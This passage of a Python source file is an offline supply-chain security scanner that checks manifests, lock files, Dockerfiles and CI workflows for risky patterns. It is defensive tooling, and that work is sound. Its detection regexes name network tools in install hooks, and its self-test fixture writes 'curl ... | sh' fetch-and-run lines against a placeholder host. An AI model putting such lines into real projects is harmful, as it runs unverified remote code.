#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""sc-check.py -- offline supply-chain posture check for a source tree.

Pure standard library. It reads manifests, lock files, Dockerfiles and CI
configuration; it does not install packages, run builds, pull images, or touch
the network. Findings are leads for a human, not proof of exploitability.

Covered:
  * missing lock files (npm / Python / Go / Rust / Ruby / PHP / Java)
  * wide version ranges (^ ~ >= * latest git+ http file:)
  * GitHub Actions: write-all, missing permissions, pull_request_target,
    unpinned third-party actions, expression injection, self-hosted runners
  * Dockerfile / compose: unpinned or :latest image tags, curl|sh, secret ARG
  * dependency confusion: private scopes without a pinned registry and
    internal-looking Python packages without a private index
  * lock file integrity (package-lock entries without integrity)
  * 2026 npm worm rules (offline, static):
      SC-101 postinstall-network  -- preinstall/postinstall runs curl/wget/
                                     node -e/bun/child_process/net./http
      SC-102 rdd-ref            -- file:/link:/http(s):/git+ dependency, or
                                     "*" version whose lock resolved is a
                                     remote tarball
      SC-103 action-tag-mutable -- uses: owner/repo@vN (movable tag) instead of
                                     a 40-hex commit SHA
    These are emitted in "rule_hits" as {rule, severity, file, line, evidence};
    they are leads, not proof of compromise (see
    references/dependency-confusion.md §8).

Exit codes:
  0 = scan completed, no high/critical finding; or --self-test passed
  1 = scan completed, at least one high/critical finding
  2 = usage/path/scan failure, stdout is {"ok": false, "blocked_at": ..., "reason": ...}

Output is always JSON on stdout (also written with --out). Missing external
tools are reported in "degraded"; the scan itself always uses stdlib only.

Usage:
    python Tool/skill/supply-chain-security/scripts/sc-check.py --path . --out sc.json
    python Tool/skill/supply-chain-security/scripts/sc-check.py --path Tool/ --max-files 5000
    python Tool/skill/supply-chain-security/scripts/sc-check.py --self-test

--self-test is fully offline: it writes a minimal manifest/lock/workflow/
Dockerfile into a temp dir, runs the same rules, and asserts the key
categories and the structured error shape.
"""

from __future__ import annotations

import argparse
import fnmatch
import json
import os
import re
import shutil
import sys
import tempfile

SCHEMA = "seep.sc-check/1"
VERSION = "1.1.0"

SKIP_DIRS = {
    ".git", ".svn", ".hg", "node_modules", "bower_components", "vendor",
    "dist", "build", "target", "__pycache__", ".venv", "venv", ".tox",
    ".mypy_cache", ".pytest_cache", ".next", ".nuxt", ".cache", "Pods",
    ".gradle", ".idea", ".vscode-test", "coverage",
}

LOCK_NAMES_JS = ("package-lock.json", "npm-shrinkwrap.json", "yarn.lock", "pnpm-lock.yaml")
LOCK_NAMES_PY = ("Pipfile.lock", "poetry.lock", "uv.lock", "pdm.lock")
LOCK_NAMES_RUST = ("Cargo.lock",)
LOCK_NAMES_RUBY = ("Gemfile.lock",)
LOCK_NAMES_PHP = ("composer.lock",)
LOCK_NAMES_NET = ("packages.lock.json", "paket.lock")
LOCK_NAMES_GRADLE = ("gradle.lockfile",)

PRIVATE_PY = re.compile(r"^(corp|internal|company|private|svc|platform|acme)[-_]", re.I)
PRIVATE_SCOPE = re.compile(r"@(corp|internal|company|private|acme|example)[.-]", re.I)

LEVEL_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

# --- 2026 npm worm 规则（离线静态；只读文件，不执行任何安装脚本） ---
POSTINSTALL_NET = re.compile(
    r"\bcurl\b|\bwget\b|node\s+-e|\bbun\b|child_process|\bnet\.|https?://", re.I)
RDD_VALUE = re.compile(r"^(file:|link:|https?://|git\+)", re.I)
MUTABLE_TAG = re.compile(r"^v?\d+(?:\.\d+){0,2}$")


def add_rule(hits, rule, severity, file, line, evidence):
    """规则命中形状固定为 {rule, severity, file, line, evidence}。"""
    hits.append({
        "rule": rule,
        "severity": severity,
        "file": file,
        "line": line,
        "evidence": str(evidence)[:500],
    })


def find_line(text, needle):
    for i, ln in enumerate(text.splitlines(), 1):
        if needle in ln:
            return i
    return None


def add_risk(risks, level, category, file, evidence, why, fix, line=None,
             confidence="high"):
    risks.append({
        "id": "SC-%03d" % (len(risks) + 1),
        "level": level,
        "category": category,
        "file": file,
        "line": line,
        "evidence": evidence[:500],
        "why": why,
        "fix": fix,
        "confidence": confidence,
    })


def read_text(path, limit=2 * 1024 * 1024):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read(limit)
    except OSError:
        return ""


def rel(base, path):
    return os.path.relpath(path, base).replace("\\", "/")


def collect(base, max_files, max_depth):
    files = []
    truncated = False
    for root, dirs, names in os.walk(base):
        r = os.path.relpath(root, base)
        depth = 0 if r == "." else r.count(os.sep) + 1
        if depth >= max_depth:
            dirs[:] = []
        dirs[:] = sorted(d for d in dirs
                         if d not in SKIP_DIRS and d not in (".git", ".svn", ".hg"))
        for name in sorted(names):
            files.append(os.path.join(root, name))
            if len(files) >= max_files:
                truncated = True
                return files, truncated
    return files, truncated


def classify(path, base):
    name = os.path.basename(path)
    low = name.lower()
    r = rel(base, path)
    if name == "package.json":
        return "manifest", "npm"
    if name in ("package-lock.json", "npm-shrinkwrap.json") or low in ("yarn.lock", "pnpm-lock.yaml"):
        return "lock", "npm"
    if re.match(r"(requirements|constraints).*\.txt$", low):
        return "manifest", "python"
    if low in ("pyproject.toml", "pipfile", "setup.py", "setup.cfg"):
        return "manifest", "python"
    if low in ("pipfile.lock", "poetry.lock", "uv.lock", "pdm.lock"):
        return "lock", "python"
    if name in ("go.mod", "go.work"):
        return "manifest", "go"
    if name == "go.sum":
        return "lock", "go"
    if name in ("Cargo.toml",):
        return "manifest", "rust"
    if name == "Cargo.lock":
        return "lock", "rust"
    if name == "Gemfile":
        return "manifest", "ruby"
    if name == "Gemfile.lock":
        return "lock", "ruby"
    if name == "composer.json":
        return "manifest", "php"
    if name == "composer.lock":
        return "lock", "php"
    if name in ("pom.xml", "build.gradle", "build.gradle.kts"):
        return "manifest", "java"
    if name in ("gradle.lockfile",):
        return "lock", "java"
    if name.endswith((".csproj", ".fsproj", ".vbproj")):
        return "manifest", "dotnet"
    if name in ("packages.lock.json", "paket.lock"):
        return "lock", "dotnet"
    if name == "Dockerfile" or name.startswith("Dockerfile.") or low.endswith(".dockerfile"):
        return "dockerfile", "container"
    if re.match(r"(docker-)?compose.*\.ya?ml$", low):
        return "compose", "container"
    if "/.github/workflows/" in "/" + r and low.endswith((".yml", ".yaml")):
        return "workflow", "ci"
    if low == ".gitlab-ci.yml":
        return "gitlab", "ci"
    if name == "Jenkinsfile":
        return "jenkins", "ci"
    if name == ".npmrc":
        return "npmrc", "npm"
    if name in ("pip.conf", "pip.ini"):
        return "pipconf", "python"
    if name in ("nuget.config", "NuGet.config", "nuget.Config"):
        return "nuget", "dotnet"
    if name == ".dockerignore":
        return "dockerignore", "container"
    return "", ""


def find_near(start, base, names):
    cur = os.path.abspath(start)
    stop = os.path.abspath(base)
    while True:
        for name in names:
            if os.path.isfile(os.path.join(cur, name)):
                return os.path.join(cur, name)
        if os.path.normcase(cur) == os.path.normcase(stop):
            return ""
        parent = os.path.dirname(cur)
        if parent == cur:
            return ""
        cur = parent


def parse_npmrc(paths):
    scoped = {}
    default = ""
    for p in paths:
        for line in read_text(p).splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = re.match(r"^(@[\w.-]+):registry\s*=\s*(\S+)", line)
            if m:
                scoped[m.group(1).lower()] = m.group(2)
            m = re.match(r"^registry\s*=\s*(\S+)", line)
            if m:
                default = m.group(1)
    return scoped, default


def lock_resolved(path):
    """package-lock v2/v3：包名(小写) -> resolved，用于 SC-102 的"*+远程 tarball"。"""
    out = {}
    if os.path.basename(path) not in ("package-lock.json", "npm-shrinkwrap.json"):
        return out
    try:
        data = json.loads(read_text(path))
    except Exception:  # noqa: BLE001
        return out
    pkgs = data.get("packages")
    if isinstance(pkgs, dict):
        for key, meta in pkgs.items():
            if not key or not isinstance(meta, dict):
                continue
            name = key.rsplit("node_modules/", 1)[-1].lower()
            if name and meta.get("resolved"):
                out[name] = str(meta.get("resolved"))
    return out


def analyze_package_json(base, path, inventory, risks, npmrc_paths, hits):
    text = read_text(path)
    try:
        data = json.loads(text)
    except Exception as exc:  # noqa: BLE001
        add_risk(risks, "low", "manifest", rel(base, path),
                 "package.json 无法解析: %s" % exc,
                 "清单损坏或使用 JSON5/注释，静态扫描会漏依赖。",
                 "修正为合法 JSON，或人工审查该文件。", confidence="medium")
        return
    d = os.path.dirname(path)
    lock = find_near(d, base, LOCK_NAMES_JS)

    # SC-101 postinstall-network：安装钩子里出现网络/子进程 = 自动执行面。
    scripts = data.get("scripts") if isinstance(data.get("scripts"), dict) else {}
    for hook in ("preinstall", "postinstall"):
        cmd = scripts.get(hook)
        if isinstance(cmd, str) and POSTINSTALL_NET.search(cmd):
            add_rule(hits, "SC-101 postinstall-network", "high", rel(base, path),
                     find_line(text, '"%s"' % hook),
                     "%s: %s" % (hook, cmd.strip()))

    sections = ("dependencies", "devDependencies", "optionalDependencies")
    deps = {}
    for sec in sections:
        if isinstance(data.get(sec), dict):
            deps.update(data[sec])
    if not deps:
        return
    if not lock:
        add_risk(risks, "high", "lockfile", rel(base, path),
                 "%d 个依赖，但同目录/祖先目录没有 package-lock.json / yarn.lock / pnpm-lock.yaml" % len(deps),
                 "无锁文件时安装结果随 registry 漂移，无法复现 SBOM，也无法校验完整性。",
                 "提交锁文件并在 CI 中用 npm ci / yarn --frozen-lockfile / pnpm --frozen-lockfile。")

    wide, severe = [], []
    for name, spec in sorted(deps.items()):
        if not isinstance(spec, str):
            continue
        s = spec.strip()
        if s.startswith("workspace:"):
            continue
        if (s in ("*", "latest", "") or s.startswith(("git+", "git://", "http://", "https://", "file:", "link:"))):
            severe.append("%s@%s" % (name, s))
        elif s.startswith(("^", "~", ">=", ">", "<", "<=")):
            wide.append("%s@%s" % (name, s))
    if severe:
        add_risk(risks, "high", "version-range", rel(base, path),
                 "; ".join(severe[:8]) + (" ..." if len(severe) > 8 else ""),
                 "通配/最新版/URL/git/file 依赖不受 registry 版本约束，内容可被替换。",
                 "改为精确版本或受控 semver 范围，并把来源固定到不可变 commit/digest。")
    if wide:
        add_risk(risks, "medium", "version-range", rel(base, path),
                 "%d 条宽范围，例如 %s" % (len(wide), "; ".join(wide[:8])),
                 "宽范围会随时间拉入新的传递依赖，构建不可复现。",
                 "锁文件 + 定期受控升级；关键依赖用精确版本。", confidence="medium")

    # SC-102 rdd-ref：远程/本地动态依赖，或 "*" 版本在锁文件里解析到远程 tarball。
    resolved = lock_resolved(lock) if lock else {}
    for name, spec in sorted(deps.items()):
        s = str(spec).strip()
        m_rdd = RDD_VALUE.match(s)
        star_remote = s in ("*", "") and resolved.get(name.lower(), "").startswith(
            ("http://", "https://"))
        if not (m_rdd or star_remote):
            continue
        sev = "medium" if s.startswith(("file:", "link:")) else "high"
        evidence = "%s@%s" % (name, s)
        if star_remote:
            evidence += " resolved=" + resolved.get(name.lower(), "")
        add_rule(hits, "SC-102 rdd-ref", sev, rel(base, path),
                 find_line(text, name), evidence)

    # Dependency confusion: scoped packages without a scope registry mapping.
    scoped_cfg, default_cfg = parse_npmrc(npmrc_paths)
    scopes = sorted({n.split("/", 1)[0].lower() for n in deps if n.startswith("@") and "/" in n})
    if scopes:
        unmapped = [s for s in scopes if s not in scoped_cfg]
        if unmapped:
            level = "high" if any(PRIVATE_SCOPE.search(s) for s in unmapped) else "medium"
            add_risk(risks, level, "dependency-confusion", rel(base, path),
                     "scopes=%s；.npmrc 未为这些 scope 指定 registry（default=%s）" % (
                         ", ".join(unmapped[:8]), default_cfg or "npmjs"),
                     "私有 scope 未锁定 registry 时，同名公共包可能被优先解析（依赖混淆）。",
                     "在 .npmrc 写 @scope:registry=<private>，并对公共包做 scope 隔离。",
                     confidence="medium")

    # Lock integrity: package-lock v2/v3 packages entries should carry integrity.
    if lock and os.path.basename(lock) in ("package-lock.json", "npm-shrinkwrap.json"):
        try:
            lock_data = json.loads(read_text(lock))
        except Exception:  # noqa: BLE001
            lock_data = {}
        pkgs = lock_data.get("packages")
        if isinstance(pkgs, dict):
            missing = []
            for key, meta in pkgs.items():
                if not key or not isinstance(meta, dict):
                    continue
                if meta.get("link") or meta.get("resolved", "").startswith("file:"):
                    continue
                if meta.get("resolved") and not meta.get("integrity"):
                    missing.append(key)
            if missing:
                add_risk(risks, "medium", "lock-integrity", rel(base, lock),
                         "%d 个条目缺少 integrity，例如 %s" % (len(missing), ", ".join(missing[:6])),
                         "没有 integrity 的锁定条目无法发现 registry 内容被替换。",
                         "重新生成锁文件，确认每个 resolved 条目都有 integrity。",
                         confidence="medium")


def analyze_requirements(base, path, risks):
    text = read_text(path)
    pinned = 0
    loose, severe = [], []
    for idx, raw in enumerate(text.splitlines(), 1):
        line = raw.split("#", 1)[0].strip()
        if not line or line.startswith(("-r ", "-c ", "--index-url", "--extra-index-url",
                                        "--trusted-host", "--hash", "--no-binary")):
            continue
        if line.startswith(("-e ", "git+", "http://", "https://")):
            severe.append("L%d %s" % (idx, line))
            continue
        m = re.match(r"^([A-Za-z0-9_.-]+)(\[[^\]]+\])?\s*([<>=!~].*)?$", line)
        if not m:
            continue
        name, spec = m.group(1), (m.group(3) or "").strip()
        if spec.startswith("=="):
            pinned += 1
        elif spec:
            loose.append("L%d %s%s" % (idx, name, spec))
        else:
            severe.append("L%d %s (no version)" % (idx, name))
        if PRIVATE_PY.search(name):
            add_risk(risks, "high", "dependency-confusion", rel(base, path),
                     "L%d 私有风格包名未证明来自私有 index: %s" % (idx, name),
                     "内部包若未绑定私有 index，公共 registry 上的同名包可能被安装。",
                     "在 pip.conf 写 index-url/extra-index-url，或使用 --index-url 锁定并校验 hash。",
                     line=idx, confidence="medium")
    if severe:
        add_risk(risks, "high", "version-range", rel(base, path),
                 "; ".join(severe[:8]),
                 "无版本/URL/git 依赖无法校验来源与完整性。",
                 "钉精确版本 + hash，或改用受控私有 index。", confidence="medium")
    if loose:
        add_risk(risks, "medium", "version-range", rel(base, path),
                 "%d 条非精确约束，例如 %s" % (len(loose), "; ".join(loose[:8])),
                 ">=/~= 等范围会在重建时解析到新版本。",
                 "生成带 hash 的锁定清单（pip-compile / uv lock / poetry lock）。")
    lock = find_near(os.path.dirname(path), base, LOCK_NAMES_PY)
    if not lock and not pinned:
        add_risk(risks, "high", "lockfile", rel(base, path),
                 "Python 清单无锁定文件，且没有 == 精确版本",
                 "安装结果依赖解析时的最新版本，SBOM 不可复现。",
                 "提交 poetry.lock / uv.lock / Pipfile.lock，或用 pip-compile 生成带 hash 的 requirements。")
    elif not lock and pinned:
        add_risk(risks, "low", "lockfile", rel(base, path),
                 "requirements 已全部 == 固定，但没有锁文件/hash",
                 "版本固定但 wheel 内容仍未校验。",
                 "加 --hash 或改用锁文件；供应链要求高时启用私有 index 校验。",
                 confidence="medium")


def analyze_pyproject(base, path, risks):
    text = read_text(path)
    loose = []
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        m = re.match(r"^[\"']([A-Za-z0-9_.-]+)(\[[^\]]+\])?\s*([<>=!~][^\"']*)?[\"'],?$", s)
        if m and m.group(3):
            spec = m.group(3).strip()
            if not spec.startswith("=="):
                loose.append("%s%s" % (m.group(1), spec))
    if loose:
        add_risk(risks, "medium", "version-range", rel(base, path),
                 "%d 条宽范围，例如 %s" % (len(loose), ", ".join(loose[:8])),
                 "pyproject 直接声明范围，锁文件才是可复现边界。",
                 "保留 pyproject 范围，提交 poetry.lock / uv.lock。", confidence="medium")


def analyze_go(base, path, risks):
    text = read_text(path)
    lock = find_near(os.path.dirname(path), base, ("go.sum",))
    if not lock:
        add_risk(risks, "medium", "lockfile", rel(base, path),
                 "go.mod 存在但同目录/祖先目录没有 go.sum",
                 "go.sum 缺失时模块内容无法校验，构建不可复现。",
                 "运行 go mod tidy 并提交 go.sum；CI 使用 -mod=readonly。")
    for idx, line in enumerate(text.splitlines(), 1):
        if re.match(r"^\s*replace\s+.+=>\s*(\.\.?/|/|[A-Za-z]:\\)", line):
            add_risk(risks, "medium", "version-range", rel(base, path),
                     "L%d %s" % (idx, line.strip()),
                     "本地 replace 可能指向未审计的代码；发布时也容易失效。",
                     "明确记录 replace 的原因、范围与移除条件。", line=idx)


def analyze_container(base, path, risks, is_compose=False):
    text = read_text(path)
    r = rel(base, path)
    if is_compose:
        for idx, line in enumerate(text.splitlines(), 1):
            m = re.match(r"^\s*image:\s*['\"]?([^'\"\s#]+)", line)
            if m:
                image = m.group(1)
                if "@sha256:" not in image:
                    level = "high" if (":" not in image.rsplit("/", 1)[-1] or image.endswith(":latest")) else "medium"
                    add_risk(risks, level, "image-tag", r,
                             "L%d image: %s" % (idx, image),
                             "compose 用可变 tag，部署内容会随时间变化。",
                             "固定到 image:tag@sha256:<digest>。", line=idx, confidence="medium")
        return
    has_user = False
    stages = set()
    for idx, line in enumerate(text.splitlines(), 1):
        s = line.strip()
        if re.match(r"^USER\s+", s, re.I):
            has_user = True
        m = re.match(r"^FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?", s, re.I)
        if m:
            image, alias = m.group(1), m.group(2)
            if alias:
                stages.add(alias.lower())
            if image.lower() == "scratch" or image.lower() in stages:
                # "FROM base" in a multi-stage build is a local stage alias.
                continue
            if "@sha256:" in image:
                continue
            last = image.rsplit("/", 1)[-1]
            if ":" not in last or last.endswith(":latest"):
                add_risk(risks, "high", "image-tag", r,
                         "L%d FROM %s" % (idx, image),
                         "基础镜像没有固定 digest/tag，构建结果不可复现。",
                         "改为 FROM image:tag@sha256:<digest>，并在 CI 校验 digest。",
                         line=idx)
            else:
                add_risk(risks, "medium", "image-tag", r,
                         "L%d FROM %s" % (idx, image),
                         "tag 可被移动，tag 不等于内容。",
                         "在 tag 后追加 @sha256:<digest>。", line=idx, confidence="medium")
        if re.match(r"^ADD\s+https?://", s, re.I):
            add_risk(risks, "high", "dockerfile", r, "L%d %s" % (idx, s),
                     "ADD 远程 URL 会下载未校验内容，且不校验 TLS 之外的完整性。",
                     "改为 COPY + 校验 sha256，或固定 digest。", line=idx)
        if re.search(r"(curl|wget)[^|;]*\|\s*(ba)?sh", s):
            add_risk(risks, "high", "dockerfile", r, "L%d %s" % (idx, s),
                     "curl|sh 在构建期执行远端脚本，内容不可复现。",
                     "下载固定版本并校验 hash 后执行。", line=idx)
        if re.match(r"^(ARG|ENV)\s+.*(PASSWORD|SECRET|TOKEN|PRIVATE_KEY|API_KEY)", s, re.I):
            add_risk(risks, "high", "secret-in-image", r, "L%d %s" % (idx, s),
                     "密钥进入构建参数/环境变量，可能留在镜像层或 history。",
                     "改用 BuildKit secret mount 或多阶段临时注入，勿写入 ENV/ARG。",
                     line=idx, confidence="medium")
    if not has_user:
        add_risk(risks, "low", "dockerfile", r,
                 "没有 USER 指令（默认 root）",
                 "容器内 root 放大逃逸与写文件影响。",
                 "创建非 root 用户并 USER <uid>。", confidence="medium")


def analyze_workflow(base, path, risks, hits):
    text = read_text(path)
    r = rel(base, path)
    lines = text.splitlines()
    has_permissions = False
    pr_target = any(re.search(r"^\s*(on\s*:\s*)?pull_request_target\s*:", ln)
                    or re.search(r"\bon\s*:\s*\[[^\]]*pull_request_target", ln)
                    for ln in lines)
    in_run = False
    run_indent = 0
    for idx, line in enumerate(lines, 1):
        s = line.strip()
        indent = len(line) - len(line.lstrip())
        if re.match(r"^\s*-?\s*(run|script)\s*:", line):
            in_run, run_indent = True, indent
        elif in_run and s and indent <= run_indent:
            in_run = False
        if re.match(r"^permissions\s*:", s):
            has_permissions = True
        if re.search(r"write-all", s) and re.match(r"^permissions\s*:", s):
            add_risk(risks, "high", "ci-permissions", r, "L%d %s" % (idx, s),
                     "workflow token 拥有全部写权限，任何一步被利用都可改仓库/发布。",
                     "改成按 job 的最小 permissions（contents: read 起步）。", line=idx)
        if (re.match(r"^(on\s*:\s*)?pull_request_target\s*:", s)
                or re.search(r"\bon\s*:\s*\[[^\]]*pull_request_target", s)):
            add_risk(risks, "high", "ci-trigger", r, "L%d %s" % (idx, s),
                     "pull_request_target 在基仓库上下文运行，可接触 secrets 与写 token。",
                     "避免在 PR 上使用；必须用时禁止 checkout PR 代码并限制 secrets。",
                     line=idx, confidence="medium")
        if re.match(r"^(on\s*:\s*)?workflow_run\s*:", s):
            add_risk(risks, "medium", "ci-trigger", r, "L%d %s" % (idx, s),
                     "workflow_run 会继承上游产物与权限，可能被上游投毒。",
                     "把上游产物视为不可信输入，校验来源与 digest。", line=idx,
                     confidence="medium")
        if "self-hosted" in s and not s.startswith("#"):
            add_risk(risks, "medium", "ci-runner", r, "L%d %s" % (idx, s),
                     "自托管 runner 跑不可信 PR 会持久化、横向到内网。",
                     "PR 使用 GitHub 托管 runner；自托管只跑受保护分支。", line=idx,
                     confidence="medium")
        m = re.match(r"^-?\s*uses\s*:\s*([^\s#]+)", s)
        if m:
            value = m.group(1)
            if value.startswith("./") or value.startswith(".\\"):
                continue
            if value.startswith("docker://"):
                if "@sha256:" not in value:
                    add_risk(risks, "medium", "ci-action-pin", r, "L%d %s" % (idx, s),
                             "docker:// action 未固定 digest。",
                             "使用 image@sha256:<digest>。", line=idx, confidence="medium")
                continue
            if "@" not in value:
                add_risk(risks, "high", "ci-action-pin", r, "L%d %s" % (idx, s),
                         "第三方 action 未指定版本。",
                         "固定到 40 位 commit SHA。", line=idx)
            else:
                ref = value.rsplit("@", 1)[1]
                if not re.fullmatch(r"[0-9a-fA-F]{40}", ref):
                    add_risk(risks, "medium", "ci-action-pin", r, "L%d %s" % (idx, s),
                             "action 使用可移动的 tag/branch，tag 可被重写。",
                             "固定到 40 位 commit SHA，并用 Dependabot 更新。", line=idx,
                             confidence="medium")
                    # SC-103 action-tag-mutable：owner/repo@vN 这类可移动 tag。
                    m_tag = re.match(r"^[^/\s]+/[^/\s]+@(.+)$", value)
                    if m_tag and MUTABLE_TAG.match(m_tag.group(1)):
                        add_rule(hits, "SC-103 action-tag-mutable", "medium", r, idx, s)
        if in_run and "${{" in s and re.search(r"github\.(event\.|head_ref)", s):
            add_risk(risks, "high", "ci-injection", r, "L%d %s" % (idx, s),
                     "不可信事件字段进入 run/script，可能造成脚本注入。",
                     "通过 env 传值并加引号，不要直接插值到 run/script。", line=idx,
                     confidence="medium")
        if pr_target and re.match(r"^ref\s*:", s) and "github.event.pull_request.head" in s:
            add_risk(risks, "high", "ci-checkout-pr", r, "L%d %s" % (idx, s),
                     "pull_request_target 下 checkout PR head，等于在基仓库上下文执行不可信代码。",
                     "改用 pull_request；或只读 job + 无 secrets + 显式限制权限 + 人工审批。",
                     line=idx, confidence="medium")
    if pr_target and re.search(r"secrets\.", text):
        add_risk(risks, "high", "ci-secrets", r,
                 "pull_request_target 与 secrets.* 同时出现",
                 "不可信 PR 代码路径可能读到仓库 secrets。",
                 "把 secrets 限制在受保护分支/环境保护规则内，PR 流程禁止使用。",
                 confidence="medium")
    if not has_permissions:
        add_risk(risks, "medium", "ci-permissions", r,
                 "workflow 没有显式 permissions:",
                 "未声明时使用仓库默认 token 权限；老仓库默认可能是读写。",
                 "显式声明最小 permissions（通常 contents: read）。",
                 confidence="medium")


def analyze_gitlab(base, path, risks):
    text = read_text(path)
    r = rel(base, path)
    for idx, line in enumerate(text.splitlines(), 1):
        if re.match(r"^\s*-\s*(remote|https?://)", line) or "include:" in line and "http" in line:
            add_risk(risks, "medium", "ci-include", r, "L%d %s" % (idx, line.strip()),
                     "远端 include 可在上游被替换，执行内容不受本仓库评审。",
                     "固定到 commit/tag 并镜像到受控仓库。", line=idx, confidence="medium")
        if re.search(r"\b(curl|wget)\b.*\|\s*(ba)?sh", line):
            add_risk(risks, "high", "ci-injection", r, "L%d %s" % (idx, line.strip()),
                     "CI 下载并执行远端脚本。",
                     "下载固定版本并校验 hash。", line=idx)


def analyze_jenkins(base, path, risks):
    text = read_text(path)
    r = rel(base, path)
    for idx, line in enumerate(text.splitlines(), 1):
        if re.search(r"sh\s+[\"'].*\$\{?(params|env)\.", line):
            add_risk(risks, "high", "ci-injection", r, "L%d %s" % (idx, line.strip()),
                     "参数直接插入 shell，可能命令注入。",
                     "使用 withEnv/单引号并白名单校验参数。", line=idx, confidence="medium")
        if "load " in line and "http" in line:
            add_risk(risks, "medium", "ci-include", r, "L%d %s" % (idx, line.strip()),
                     "远端共享库未固定版本。",
                     "固定 commit 并镜像到受控仓库。", line=idx, confidence="medium")


class ScanError(Exception):
    """扫描阶段失败：带阶段名，交给 emit_error 输出结构化 JSON。"""

    def __init__(self, blocked_at, reason):
        super().__init__(reason)
        self.blocked_at = blocked_at
        self.reason = reason


def emit_error(blocked_at, reason, rc=2):
    """统一失败形状：{"ok": false, "blocked_at": ..., "reason": ...}，rc=2。"""
    print(json.dumps({"ok": False, "blocked_at": blocked_at, "reason": reason},
                     ensure_ascii=False))
    return rc


def public_path(path):
    """输出里尽量用相对仓库根/CWD 的路径，避免把本机绝对路径写进证据。"""
    try:
        rel = os.path.relpath(path, os.getcwd())
    except ValueError:
        return path
    return path if rel.startswith("..") else rel.replace(os.sep, "/")


def self_test():
    """离线自检：内置最小仓库（清单/锁/workflow/Dockerfile），断言规则命中与失败形状。"""
    import contextlib
    import io
    import types

    checks = []
    with tempfile.TemporaryDirectory(prefix="sc-check-selftest-") as td:
        def put(rel, text):
            full = os.path.join(td, rel.replace("/", os.sep))
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "w", encoding="utf-8") as fh:
                fh.write(text)

        put("package.json", json.dumps({
            "name": "fixture-app", "version": "1.0.0",
            "dependencies": {"@corp/auth": "^1.0.0", "left-pad": "*"},
            "scripts": {"postinstall": "curl -fsSL http://example.invalid/x.sh | sh"},
        }, ensure_ascii=False))
        put(".npmrc", "registry=https://registry.npmjs.org/\n")
        put("package-lock.json", json.dumps({
            "name": "fixture-app", "lockfileVersion": 3,
            "packages": {
                "": {"name": "fixture-app", "version": "1.0.0"},
                "node_modules/left-pad": {"version": "1.3.0", "resolved": "http://mirror.invalid/left-pad-1.3.0.tgz"},
                "node_modules/@corp/auth": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/@corp/auth/-/auth-1.0.0.tgz", "integrity": "sha512-AAAA"},
            },
        }))
        put(".github/workflows/ci.yml", """name: ci
on:
  pull_request_target:
    branches: [main]
permissions: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "${{ github.event.pull_request.title }}"
""")
        put("Dockerfile", "FROM node:latest\nUSER root\nRUN curl -fsSL http://example.invalid/i.sh | sh\n")

        args = types.SimpleNamespace(path=td, max_files=200, max_depth=8, out="")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            run_rc = run(args)
        try:
            res = json.loads(buf.getvalue())
        except ValueError as exc:
            return emit_error("self-test", "输出不是 JSON: %s" % exc)

        checks.append(("scan-ok", res.get("ok") is True))
        checks.append(("rc-type", run_rc in (0, 1)))
        cats = {r.get("category") for r in res.get("risks") or []}
        for need in ("version-range", "lock-integrity", "dependency-confusion",
                     "ci-permissions", "ci-trigger", "ci-action-pin", "image-tag"):
            checks.append(("category:" + need, need in cats))
        wf = (res.get("inventory") or {}).get("workflows") or []
        checks.append(("workflow-indexed", len(wf) == 1))
        checks.append(("risk-shape", all({"id", "level", "category", "file", "evidence",
                                          "why", "fix"} <= set(r) for r in res.get("risks") or [])))
        # SC-101/102/103：内置 fixture 必须三条全中，且形状固定。
        rules = {h.get("rule") for h in res.get("rule_hits") or []}
        for need in ("SC-101 postinstall-network", "SC-102 rdd-ref",
                     "SC-103 action-tag-mutable"):
            checks.append(("rule:" + need, need in rules))
        checks.append(("rule-hit-shape", bool(res.get("rule_hits")) and all(
            {"rule", "severity", "file", "line", "evidence"} <= set(h)
            for h in res.get("rule_hits") or [])))
        checks.append(("guarantees", "no network" in (res.get("tool") or {}).get("guarantees", [])))

    bad = {"ok": False, "blocked_at": "path"}
    checks.append(("error-shape", bad.get("ok") is False and bad.get("blocked_at") == "path"))
    failed = [name for name, ok in checks if not ok]
    if failed:
        return emit_error("self-test", "失败项: " + ",".join(failed))
    print(json.dumps({"ok": True, "checks": len(checks), "mode": "builtin-fixture"},
                     ensure_ascii=False))
    return 0


def run(args):
    base = os.path.abspath(args.path)
    if not os.path.isdir(base):
        raise ScanError("path", "--path 不存在或不是目录: %s" % args.path)

    files, truncated = collect(base, max(1, args.max_files), max(1, args.max_depth))
    inventory = {k: [] for k in ("manifests", "locks", "dockerfiles", "compose",
                                "workflows", "gitlab", "jenkins", "npmrc",
                                "pipconf", "nuget", "dockerignore")}
    kinds = {}
    for path in files:
        kind, eco = classify(path, base)
        if not kind:
            continue
        r = rel(base, path)
        if kind == "manifest":
            inventory["manifests"].append({"path": r, "ecosystem": eco})
            kinds.setdefault(eco, set()).add(r)
        elif kind == "lock":
            inventory["locks"].append({"path": r, "ecosystem": eco})
        elif kind == "dockerfile":
            inventory["dockerfiles"].append(r)
        elif kind == "compose":
            inventory["compose"].append(r)
        elif kind == "workflow":
            inventory["workflows"].append(r)
        elif kind == "gitlab":
            inventory["gitlab"].append(r)
        elif kind == "jenkins":
            inventory["jenkins"].append(r)
        elif kind == "npmrc":
            inventory["npmrc"].append(path)
        elif kind == "pipconf":
            inventory["pipconf"].append(path)
        elif kind == "nuget":
            inventory["nuget"].append(r)
        elif kind == "dockerignore":
            inventory["dockerignore"].append(r)

    risks = []
    manifest_by_kind = {}
    for path in files:
        kind, eco = classify(path, base)
        if kind == "manifest":
            manifest_by_kind.setdefault(eco, []).append(path)

    hits = []
    for path in manifest_by_kind.get("npm", []):
        analyze_package_json(base, path, inventory, risks, inventory["npmrc"], hits)
    for path in manifest_by_kind.get("python", []):
        if os.path.basename(path).startswith(("requirements", "constraints")):
            analyze_requirements(base, path, risks)
        elif os.path.basename(path) == "pyproject.toml":
            analyze_pyproject(base, path, risks)
